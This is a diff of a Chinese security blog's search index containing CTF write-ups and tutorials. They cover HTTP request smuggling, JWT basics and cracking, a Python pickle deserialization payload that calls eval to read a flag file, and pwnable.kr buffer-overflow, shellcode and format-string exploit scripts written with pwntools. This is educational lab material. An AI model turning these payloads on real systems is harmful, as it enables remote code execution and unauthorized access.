@@ -8,6 +8,7 @@
 
 </li>
 </ul>
+<a id="more"></a>
 <p>get_shell_函数:</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int get_shell_()</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;tql~tql~tql~tql~tql~tql~tql&quot;);</span><br><span class="line">  puts(&quot;this is your flag!&quot;);</span><br><span class="line">  return system(&quot;cat flag&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
@@ -54,6 +55,7 @@
 <li><p>RFC2616规范<br>如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。<br>由于规范默许可以使用<code>Transfer-Encoding</code>和<code>Content-Length</code>处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将<code>Transfer-Encoding</code>隐藏在服务端的一个chain中时，它将会回退到使用<code>Content-Length</code>去发送请求。</p>
 </li>
 <li><p>走私攻击实现<br>当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p>
+<a id="more"></a>
 <h2 id="0x03-如何执行HTTP请求走私攻击"><a href="#0x03-如何执行HTTP请求走私攻击" class="headerlink" title="0x03 如何执行HTTP请求走私攻击"></a>0x03 如何执行HTTP请求走私攻击</h2><p>HTTP请求走私攻击涉及将Content-Length标头和Transfer-Encoding标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p>
 </li>
 <li><p>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。</p>
@@ -154,6 +156,124 @@
       </tags>
   </entry>
   <entry>
+    <title>jwt</title>
+    <url>/2019/12/25/jwt/</url>
+    <content><![CDATA[<h1 id="jwt基础知识"><a href="#jwt基础知识" class="headerlink" title="jwt基础知识"></a>jwt基础知识</h1><h2 id="JSON-web-token是什么"><a href="#JSON-web-token是什么" class="headerlink" title="JSON web token是什么"></a>JSON web token是什么</h2><ul>
+<li>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。<h2 id="什么时候你应该用JSON-Web-Tokens"><a href="#什么时候你应该用JSON-Web-Tokens" class="headerlink" title="什么时候你应该用JSON Web Tokens"></a>什么时候你应该用JSON Web Tokens</h2>下列场景中使用JSON Web Token是很有用的：</li>
+<li>Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
+<li>Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。<a id="more"></a>
+<h2 id="JSON-Web-Token的结构是什么样的"><a href="#JSON-Web-Token的结构是什么样的" class="headerlink" title="JSON Web Token的结构是什么样的"></a>JSON Web Token的结构是什么样的</h2></li>
+<li>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：1.Header</li>
+</ul>
+<p>2.Payload<br>3.Signature.</p>
+<ul>
+<li>因此，一个典型的JWT看起来是这个样子的：<code>xxxxx.yyyyy.zzzzz</code><br>接下来看一下每一部分:</li>
+<li>header<br>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。<br>例如：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>然后，用Base64对这个JSON编码就得到JWT的第一部分.</p>
+<ul>
+<li>Payload<br>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</li>
+</ul>
+<p>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。<br>Public claims : 可以随意定义。<br>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。<br>下面是一个例子:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;sub&quot;:&quot;1234567890&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;John Doe&quot;,</span><br><span class="line">    &quot;admin&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对payload进行Base64编码就得到JWT的第二部分</p>
+<p>注意，不要在JWT的payload或header中放置敏感信息，除非他们是加密的.</p>
+<ul>
+<li>Signature<br>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h1 id="BUUCTF-ikun"><a href="#BUUCTF-ikun" class="headerlink" title="BUUCTF ikun"></a>BUUCTF ikun</h1><ul>
+<li>第一步提示我们要找到lv6<br>写个脚本找一下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://web44.buuoj.cn/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,2000):</span><br><span class="line"></span><br><span class="line">	r=requests.get(url+str(i))</span><br><span class="line">	if &apos;lv6.png&apos; in r.text:</span><br><span class="line">		print (i)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>跑的有点慢,找到了lv6发现买不起.应该是要抓包修改折扣.然后拿到后台的地址.<br>但需要权限，这里涉及JWT破解,先将JWT base64解码一下,看到username是我自己的登陆名5，这里需要改为admin<br>后边解码不出来因为经过了sha256，需要破解key<br>找了一个工具破的破解工具c-jwt-cracker,爆破密码1Kun.<br>登录之后有一个<a href="http://www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个" target="_blank" rel="noopener">www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个</a><br>p=pickle.loads(urllib.unquote(become))<br>用py2跑<br>py3序列化pickle.dumps之后的结果和py2的不一样<br>怀疑是库的问题</p>
+<p>这里用了Pickle协议的方法<strong>reduce</strong>(self)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
+
+<p>这样就可以打印flag.txt里的内容了<br>将生成的payload传给become<br>拿到flag.</p>
+]]></content>
+      <tags>
+        <tag>web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnable.kr</title>
+    <url>/2019/12/25/pwnable.kr/</url>
+    <content><![CDATA[<h1 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h1><ul>
+<li>一个pwn平台.别问我为什么换方向了.刷题记录.<br>雄关漫道真如铁,而今迈步从头越.<a id="more"></a>
+<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1></li>
+<li>我们首先看到这道题的C源码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">        if(argc&lt;2)&#123;</span><br><span class="line">                printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">        int len = 0;</span><br><span class="line">        len = read(fd, buf, 32);</span><br><span class="line">        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">                printf(&quot;good job :)\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>需要得到flag，则需要执行:<code>system(&quot;/bin/cat flag&quot;);</code><br>则 必须 buf = “LETMEWIN”。<br>read(fd, buf, 32)函数中的三个参数中：</p>
+<ul>
+<li>fd == 0时：则表示标准输入；</li>
+<li>fd == 1时：则表示 标准输出；</li>
+<li>fd == 2时，则表示标准输出错误。<br>buf 表示读入的缓冲区；<br>32表示读入32字节；<br>所以我们 只需要 使 fd == 0 ，则我们就能自己输入 LETMEWIN 到 buf中。这样最终得到flag。<br>那么我们就要令<code>argv[1] = 0x1234</code>即 <code>argv[1] = 4660</code>.</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwntools</title>
+    <url>/2019/12/25/pwntools/</url>
+    <content><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><ul>
+<li><p>pwntools是一个二进制利用框架。(别问我为什么转pwn,web打不下去了好吧)可以方便有效的帮助我们编写exp。</p>
+<a id="more"></a>
+<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2></li>
+<li><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">void func(int key)&#123;</span><br><span class="line">    char overflowme[32];</span><br><span class="line">    printf(&quot;overflow me : &quot;);</span><br><span class="line">    gets(overflowme);    // smash me!</span><br><span class="line">    if(key == 0xcafebabe)&#123;</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        printf(&quot;Nah..\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    func(0xdeadbeef);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>pwntools脚本：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">c = remote(&quot;pwnable.kr&quot;, 9000)</span><br><span class="line">c.sendline(&quot;AAAA&quot; * 13 + p32(0xcafebabe))</span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>源码简洁明了，我们只需要将key改写成0xcafebabe。</p>
+<p>现在我们重新看回pwntools脚本。第一行将pwntools提供的工具引入到我们的python上下文中。</p>
+<p><code>remote(&quot;一个域名或者ip地址&quot;, 端口)</code>会连接到我们指定的地址及端口。 然后该函数会返回remote对象 (这里，我们将该对象保存到了变量 c). remote对象主要用来进行对远程主机的输入输出. 它有如下几个方法：</p>
+<ul>
+<li><code>send(payload)</code> 发送payload</li>
+<li><code>sendline(payload)</code> 发送payload，并进行换行（末尾\n）</li>
+<li><code>sendafter(some_string, payload)</code> 接收到 some_string 后, 发送你的 payload</li>
+<li><code>recvn(N)</code> 接受 N(数字) 字符</li>
+<li><code>recvline()</code> 接收一行输出</li>
+<li><code>recvlines(N)</code> 接收 N(数字) 行输出</li>
+<li><code>recvuntil(some_string)</code> 接收到 some_string 为止<br>在第三行中,<code>p32()</code>可以让我们转换整数到小端序格式. <code>p32</code>转换4字节. <code>p64</code> 和 <code>p16</code> 则分别转换 8 bit 和 2 bit 数字. <code>c.sendline</code> 将我们的payload发送到远程主机. <code>&quot;AAAA&quot; * 14</code> 是我们到key的偏移量. Pwntools 不能自动运算偏移量，用户需要自行计算。<h2 id="shellcode的编写"><a href="#shellcode的编写" class="headerlink" title="shellcode的编写"></a>shellcode的编写</h2>下一题是pwnable.kr的asm. 你需要用 ssh -p2222 <a href="mailto:asm@pwnable.kr" target="_blank" rel="noopener">asm@pwnable.kr</a> 并输入密码 guest 来查看可执行文件和源码. 这里，我们只展示利用代码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">p = process(&quot;./asm&quot;)</span><br><span class="line">context.log_level = &apos;DEBUG&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"> </span><br><span class="line">context(arch=&apos;amd64&apos;, os=&apos;linux&apos;)</span><br><span class="line"> </span><br><span class="line">shellcode = shellcraft.amd64.pushstr(&quot;this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&quot;)</span><br><span class="line">shellcode += shellcraft.amd64.linux.open(&apos;rsp&apos;,0,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.read(&apos;rax&apos;,&apos;rsp&apos;,0)</span><br><span class="line">shellcode += shellcraft.amd64.linux.write(1, &apos;rsp&apos;, 100)</span><br><span class="line"> </span><br><span class="line">p.recvuntil(&apos;shellcode: &apos;)</span><br><span class="line">p.send(asm(shellcode))</span><br><span class="line">log.success(p.recvall())</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>我们这里用到了新的api: <code>process()</code>, <code>contex.log_level</code>, <code>gdb.attach</code>, 和 <code>shellcraft</code>.<br>提醒一下，如果你想在命令行中使用<code>gdb.attach()</code>, 便需要安装并运行 tmux.<br><code>process</code> 和 <code>remote</code> 类似. remote 连接远程主机, process 则通过你声明的二进制文件路径在本地创建新的进程. 除了 I/O, process 返回的对象可以通过 gdb.attach(p) 将进程attach到gdb上. Attach 之后, gdb 便可以调试该程序来 (设置 breakpoints, 查看 stack, 以及简单的反汇编).<br>shellcraft 是一个帮忙生成shellcode的类. 在我们的例子中, 我们 open 了一个文件并 read 文件到 stdout.</p>
+<h2 id="格式化漏洞自动化"><a href="#格式化漏洞自动化" class="headerlink" title="格式化漏洞自动化"></a>格式化漏洞自动化</h2><p>我没有找到一个比较容易做的格式化漏洞题目，所以干脆用了官方文档的例子：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import tempfile</span><br><span class="line"> </span><br><span class="line">program = tempfile.mktemp()</span><br><span class="line">source  = program + &quot;.c&quot;</span><br><span class="line">write(source, &apos;&apos;&apos;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line">#define MEMORY_ADDRESS ((void*)0x11111000)</span><br><span class="line">#define MEMORY_SIZE 1024</span><br><span class="line">#define TARGET ((int *) 0x11111110)</span><br><span class="line">int main(int argc, char const *argv[])</span><br><span class="line">&#123;</span><br><span class="line">       char buff[1024];</span><br><span class="line">       void *ptr = NULL;</span><br><span class="line">       int *my_var = TARGET;</span><br><span class="line">       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</span><br><span class="line">       if(ptr != MEMORY_ADDRESS)</span><br><span class="line">       &#123;</span><br><span class="line">               perror(&quot;mmap&quot;);</span><br><span class="line">               return EXIT_FAILURE;</span><br><span class="line">       &#125;</span><br><span class="line">       *my_var = 0x41414141;</span><br><span class="line">       write(1, &amp;my_var, sizeof(int *));</span><br><span class="line">       scanf(&quot;%s&quot;, buff);</span><br><span class="line">       dprintf(2, buff);</span><br><span class="line">       write(1, my_var, sizeof(int));</span><br><span class="line">       return 0;</span><br><span class="line">&#125;&apos;&apos;&apos;)</span><br><span class="line">cmdline = [&quot;gcc&quot;, source, &quot;-Wno-format-security&quot;, &quot;-m32&quot;, &quot;-o&quot;, program]</span><br><span class="line">process(cmdline).wait_for_close()</span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    return p.recvall()</span><br><span class="line"> </span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">p = process(program, stderr=PIPE)</span><br><span class="line">addr = u32(p.recv(4))</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print hex(unpack(p.recv(4)))</span><br></pre></td></tr></table></figure>
+
+<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址:<code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
+<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload .<br><a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload</a></p>
+<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">e = ELF(&apos;./example_file&apos;)</span><br><span class="line">print hex(e.address)  # 0x400000</span><br><span class="line">print hex(e.symbols[&apos;write&apos;]) # 0x401680</span><br><span class="line">print hex(e.got[&apos;write&apos;]) # 0x60b070</span><br><span class="line">print hex(e.plt[&apos;write&apos;]) # 0x401680</span><br><span class="line">offset = e.symbols[&apos;system&apos;] - e.symbols[&apos;printf&apos;] # calculate offset</span><br><span class="line">binsh_address = next(e.search(&apos;/bin/sh\x00&apos;)) # find address which contains /bin/sh</span><br></pre></td></tr></table></figure>
+
+<p>和 process() 一样, 我们只用将路径给 ELF(path) 即可分析 ELF.</p>
+<p>我们有以下几种方法操纵ELF:</p>
+<ul>
+<li>symbols[‘a_function’] 找到 a_function 的地址</li>
+<li>got[‘a_function’] 找到 a_function的 got</li>
+<li>plt[‘a_function’] 找到 a_function 的 plt</li>
+<li>next(e.search(“some_characters”)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址.</li>
+</ul>
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>heap</title>
     <url>/2019/12/25/heap/</url>
     <content><![CDATA[<h1 id="pwn-heap"><a href="#pwn-heap" class="headerlink" title="pwn-heap"></a>pwn-heap</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器.</p>
@@ -164,6 +284,7 @@
 </ul>
 <p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</p>
 <p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p>
+<a id="more"></a>
 <h2 id="堆的基本操作"><a href="#堆的基本操作" class="headerlink" title="堆的基本操作"></a>堆的基本操作</h2><p>这里我们主要介绍</p>
 <ul>
 <li>基本的堆操作，包括堆的分配，回收，堆分配背后的系统调用</li>
@@ -455,124 +576,10 @@
       </tags>
   </entry>
   <entry>
-    <title>jwt</title>
-    <url>/2019/12/25/jwt/</url>
-    <content><![CDATA[<h1 id="jwt基础知识"><a href="#jwt基础知识" class="headerlink" title="jwt基础知识"></a>jwt基础知识</h1><h2 id="JSON-web-token是什么"><a href="#JSON-web-token是什么" class="headerlink" title="JSON web token是什么"></a>JSON web token是什么</h2><ul>
-<li>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。<h2 id="什么时候你应该用JSON-Web-Tokens"><a href="#什么时候你应该用JSON-Web-Tokens" class="headerlink" title="什么时候你应该用JSON Web Tokens"></a>什么时候你应该用JSON Web Tokens</h2>下列场景中使用JSON Web Token是很有用的：</li>
-<li>Authorization (授权) : 这是使用JWT的最常见场景。一旦用户登录，后续每个请求都将包含JWT，允许用户访问该令牌允许的路由、服务和资源。单点登录是现在广泛使用的JWT的一个特性，因为它的开销很小，并且可以轻松地跨域使用。</li>
-<li>Information Exchange (信息交换) : 对于安全的在各方之间传输信息而言，JSON Web Tokens无疑是一种很好的方式。因为JWTs可以被签名，例如，用公钥/私钥对，你可以确定发送人就是它们所说的那个人。另外，由于签名是使用头和有效负载计算的，您还可以验证内容没有被篡改。<h2 id="JSON-Web-Token的结构是什么样的"><a href="#JSON-Web-Token的结构是什么样的" class="headerlink" title="JSON Web Token的结构是什么样的"></a>JSON Web Token的结构是什么样的</h2></li>
-<li>JSON Web Token由三部分组成，它们之间用圆点(.)连接。这三部分分别是：1.Header</li>
-</ul>
-<p>2.Payload<br>3.Signature.</p>
-<ul>
-<li>因此，一个典型的JWT看起来是这个样子的：<code>xxxxx.yyyyy.zzzzz</code><br>接下来看一下每一部分:</li>
-<li>header<br>header典型的由两部分组成：token的类型（“JWT”）和算法名称（比如：HMAC SHA256或者RSA等等）。<br>例如：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;alg&quot;:&quot;HS256&quot;,</span><br><span class="line">    &quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>然后，用Base64对这个JSON编码就得到JWT的第一部分.</p>
-<ul>
-<li>Payload<br>JWT的第二部分是payload，它包含声明（要求）。声明是关于实体(通常是用户)和其他数据的声明。声明有三种类型: registered, public 和 private。</li>
-</ul>
-<p>Registered claims : 这里有一组预定义的声明，它们不是强制的，但是推荐。比如：iss (issuer), exp (expiration time), sub (subject), aud (audience)等。<br>Public claims : 可以随意定义。<br>Private claims : 用于在同意使用它们的各方之间共享信息，并且不是注册的或公开的声明。<br>下面是一个例子:</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;sub&quot;:&quot;1234567890&quot;,</span><br><span class="line">    &quot;name&quot;:&quot;John Doe&quot;,</span><br><span class="line">    &quot;admin&quot;:&quot;true&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>对payload进行Base64编码就得到JWT的第二部分</p>
-<p>注意，不要在JWT的payload或header中放置敏感信息，除非他们是加密的.</p>
-<ul>
-<li>Signature<br>为了得到签名部分，你必须有编码过的header、编码过的payload、一个秘钥，签名算法是header中<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(base64UrlEncode(header) + &quot;.&quot; + base64UrlEncode(payload), secret)</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h1 id="BUUCTF-ikun"><a href="#BUUCTF-ikun" class="headerlink" title="BUUCTF ikun"></a>BUUCTF ikun</h1><ul>
-<li>第一步提示我们要找到lv6<br>写个脚本找一下:<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">url=&quot;http://web44.buuoj.cn/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0,2000):</span><br><span class="line"></span><br><span class="line">	r=requests.get(url+str(i))</span><br><span class="line">	if &apos;lv6.png&apos; in r.text:</span><br><span class="line">		print (i)</span><br><span class="line">		break</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>跑的有点慢,找到了lv6发现买不起.应该是要抓包修改折扣.然后拿到后台的地址.<br>但需要权限，这里涉及JWT破解,先将JWT base64解码一下,看到username是我自己的登陆名5，这里需要改为admin<br>后边解码不出来因为经过了sha256，需要破解key<br>找了一个工具破的破解工具c-jwt-cracker,爆破密码1Kun.<br>登录之后有一个<a href="http://www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个" target="_blank" rel="noopener">www.zip,打开之后找到了一个python反序列化的地方，在admin.py中有一个</a><br>p=pickle.loads(urllib.unquote(become))<br>用py2跑<br>py3序列化pickle.dumps之后的结果和py2的不一样<br>怀疑是库的问题</p>
-<p>这里用了Pickle协议的方法<strong>reduce</strong>(self)</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&apos;/flag.txt&apos;,&apos;r&apos;).read()&quot;,))</span><br><span class="line"></span><br><span class="line">a = pickle.dumps(payload())</span><br><span class="line">a = urllib.quote(a)</span><br><span class="line">print a</span><br></pre></td></tr></table></figure>
-
-<p>这样就可以打印flag.txt里的内容了<br>将生成的payload传给become<br>拿到flag.</p>
-]]></content>
-      <tags>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwnable.kr</title>
-    <url>/2019/12/25/pwnable.kr/</url>
-    <content><![CDATA[<h1 id="pwnable-kr"><a href="#pwnable-kr" class="headerlink" title="pwnable.kr"></a>pwnable.kr</h1><ul>
-<li>一个pwn平台.别问我为什么换方向了.刷题记录.<br>雄关漫道真如铁,而今迈步从头越.<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1></li>
-<li>我们首先看到这道题的C源码：<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">char buf[32];</span><br><span class="line">int main(int argc, char* argv[], char* envp[])&#123;</span><br><span class="line">        if(argc&lt;2)&#123;</span><br><span class="line">                printf(&quot;pass argv[1] a number\n&quot;);</span><br><span class="line">                return 0;</span><br><span class="line">        &#125;</span><br><span class="line">        int fd = atoi( argv[1] ) - 0x1234;</span><br><span class="line">        int len = 0;</span><br><span class="line">        len = read(fd, buf, 32);</span><br><span class="line">        if(!strcmp(&quot;LETMEWIN\n&quot;, buf))&#123;</span><br><span class="line">                printf(&quot;good job :)\n&quot;);</span><br><span class="line">                system(&quot;/bin/cat flag&quot;);</span><br><span class="line">                exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;learn about Linux file IO\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<p>需要得到flag，则需要执行:<code>system(&quot;/bin/cat flag&quot;);</code><br>则 必须 buf = “LETMEWIN”。<br>read(fd, buf, 32)函数中的三个参数中：</p>
-<ul>
-<li>fd == 0时：则表示标准输入；</li>
-<li>fd == 1时：则表示 标准输出；</li>
-<li>fd == 2时，则表示标准输出错误。<br>buf 表示读入的缓冲区；<br>32表示读入32字节；<br>所以我们 只需要 使 fd == 0 ，则我们就能自己输入 LETMEWIN 到 buf中。这样最终得到flag。<br>那么我们就要令<code>argv[1] = 0x1234</code>即 <code>argv[1] = 4660</code>.</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwntools</title>
-    <url>/2019/12/25/pwntools/</url>
-    <content><![CDATA[<h1 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h1><ul>
-<li><p>pwntools是一个二进制利用框架。(别问我为什么转pwn,web打不下去了好吧).</p>
-<h2 id="Pwntools的“Hello-World”"><a href="#Pwntools的“Hello-World”" class="headerlink" title="Pwntools的“Hello World”"></a>Pwntools的“Hello World”</h2></li>
-<li><p>栈溢出无疑是二进制攻击的“Hello World”。这里，我们用pwnable.kr的bof来进行展示。</p>
